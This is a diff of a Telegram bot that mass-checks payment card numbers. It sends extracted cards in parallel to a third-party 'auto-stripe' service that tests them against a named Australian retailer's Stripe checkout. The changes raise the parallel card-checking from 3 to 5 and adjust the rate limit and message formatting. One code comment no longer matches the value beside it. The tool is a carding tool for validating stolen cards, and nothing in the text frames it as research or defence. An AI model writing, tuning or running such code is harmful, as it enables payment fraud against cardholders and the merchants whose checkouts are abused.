@@ -1629,7 +1629,7 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Processing message
     processing_text = (
         "═══\\[ 𝑷𝑹𝑶𝑪𝑬𝑺𝑺𝑰𝑵𝑮 \\]═══\n"
-        f"{bullet_link} Card ➜ {escape_markdown_v2(cc_normalized)}\n"
+        f"{bullet_link} Card ➜ `{escape_markdown_v2(cc_normalized)}`\n"
         f"{bullet_link} Gateway ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 𝑨𝒖𝒕𝒉\n"
         f"{bullet_link} Status ➜ Checking🔎\\.\\.\\.\n"
         "════════════════════"
@@ -1718,7 +1718,7 @@ async def consume_credit(user_id: int) -> bool:
 API_URL_TEMPLATE = "https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc="
 CONCURRENCY = 3
 UPDATE_INTERVAL = 1  # seconds
-RATE_LIMIT_SECONDS = 5
+RATE_LIMIT_SECONDS = 7
 user_last_command_time = {}
 
 def extract_cards_from_text(text: str) -> list[str]:
@@ -2010,7 +2010,7 @@ async def run_mass_check(msg, cards, user_id):
     start_time = time.time()
 
     queue = asyncio.Queue()
-    semaphore = asyncio.Semaphore(3)  # limit to 3 in parallel
+    semaphore = asyncio.Semaphore(5)  # limit to 3 in parallel
 
     async with aiohttp.ClientSession() as session:
         async def worker(card):
